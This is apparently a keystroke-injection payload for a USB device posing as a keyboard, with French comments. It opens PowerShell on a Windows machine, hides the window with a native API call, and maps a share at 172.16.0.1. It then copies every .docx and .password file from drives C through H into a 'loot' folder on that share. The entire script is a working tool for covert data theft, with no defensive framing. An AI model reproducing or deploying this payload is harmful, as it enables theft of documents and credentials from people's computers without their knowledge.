hide=true;
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}
layout('fr') //set layout us
press("GUI r") // windows + r
delay(500) 
type("powershell\n") // write powershell and press "enter"
delay(1000)
if (hide) { hidePS(); }
delay(300)
layout('fr')
type ('\n')
type('$loot_dir=')
layout('us') 
press("3")
layout('fr')
type ('\\\\172.16.0.1\\Data\\$Env:ComputerName\\$((Get-Date).ToString(\'yyyy-MM-dd\'))')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('net use \\\\172.16.0.1\\Data ;\n')
type('mkdir $loot_dir\n')
//Pour clé usb type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'Backup' } | select name\n")
//A-:SH Evite les dossiers invisibles
type('robocopy d:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
type('robocopy e:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
type('robocopy f:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
type('robocopy g:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
type('robocopy h:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
type('robocopy c:\\ $loot_dir *.docx *.password /A-:SH /S /MT /Z\n')
//Pour clé usb type("robocopy $Env:UserProfile $usbpath.name *.doc *.docx *.xls *.xlsx *.pdf /S /MT /Z\n")
type("exit\n")  //exit